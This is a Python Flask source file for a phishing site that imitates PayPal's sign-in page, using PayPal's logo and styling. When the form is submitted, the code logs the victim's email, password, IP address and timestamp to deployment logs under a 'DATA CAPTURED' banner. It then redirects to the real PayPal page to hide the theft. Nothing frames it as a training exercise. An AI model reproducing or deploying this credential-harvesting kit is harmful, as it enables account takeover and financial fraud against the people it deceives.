from flask import Flask, render_template_string, request, redirect
import datetime

app = Flask(__name__)

HTML_CONTENT = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign In - PayPal</title>
    <style>
        body { font-family: Arial, sans-serif; background-color: #f5f7fa; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .card { background: white; padding: 30px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); width: 90%; max-width: 400px; text-align: center; }
        h2 { color: #2c2e2d; margin-bottom: 10px; }
        p { color: #6c7378; font-size: 14px; margin-bottom: 20px; }
        input { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box; }
        button { width: 100%; padding: 12px; background-color: #0070ba; color: white; border: none; border-radius: 25px; cursor: pointer; font-weight: bold; margin-top: 15px; }
    </style>
</head>
<body>
    <div class="card">
        <img src="https://www.paypalobjects.com/webstatic/m/v/c/logo-typesmallest.png" width="100" alt="PayPal">
        <h2>Sign in</h2>
        <p>Enter your details to continue.</p>
        <form action="/api/index" method="POST">
            <input type="email" name="email" placeholder="Email" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Log In</button>
        </form>
    </div>
</body>
</html>
"""

@app.route('/')
@app.route('/api/index')
def handle_request():
    if request.method == 'GET':
        return render_template_string(HTML_CONTENT)
    
    if request.method == 'POST':
        email = request.form.get('email')
        password = request.form.get('password')
        ip = request.remote_addr
        time = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

        # This prints to the Vercel Dashboard Logs
        print("\n" + "!"*30)
        print(f"[*] ALERT: DATA CAPTURED")
        print(f"[*] TIME: {time}")
        print(f"[*] IP: {ip}")
        print(f"[*] EMAIL: {email}")
        print(f"[*] PASSWORD: {password}")
        print("!"*30 + "\n")

        return redirect("https://www.paypal.com/signin")

    return "Error", 405

app = app